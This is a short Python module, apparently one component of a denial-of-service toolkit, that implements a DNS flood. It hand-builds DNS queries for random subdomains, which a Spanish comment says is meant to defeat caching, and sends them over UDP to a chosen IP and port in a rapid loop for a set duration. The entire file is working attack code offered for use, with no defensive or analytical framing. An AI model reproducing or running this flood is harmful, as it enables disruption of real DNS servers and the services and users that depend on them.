import socket
import random
import time

def random_domain():
    # Genera nombres de dominio aleatorios para evitar caché
    return f"{random.randint(1000, 9999)}.example.com"

def build_dns_query(domain):
    transaction_id = b'\x00\x01'
    flags = b'\x01\x00'
    questions = b'\x00\x01'
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    qname = b''.join(bytes([len(x)]) + x.encode() for x in domain.split('.')) + b'\x00'
    qtype = b'\x00\x01'
    qclass = b'\x00\x01'
    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass

def run(ip, port, duration, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    try:
        while not stop_event.is_set() and time.time() < end_time:
            domain = random_domain()
            dns_query = build_dns_query(domain)
            sock.sendto(dns_query, (ip, port))
            time.sleep(0.001)
    except Exception as e:
        print(f"[DNSFlood Error] {e}")
    finally:
        sock.close()

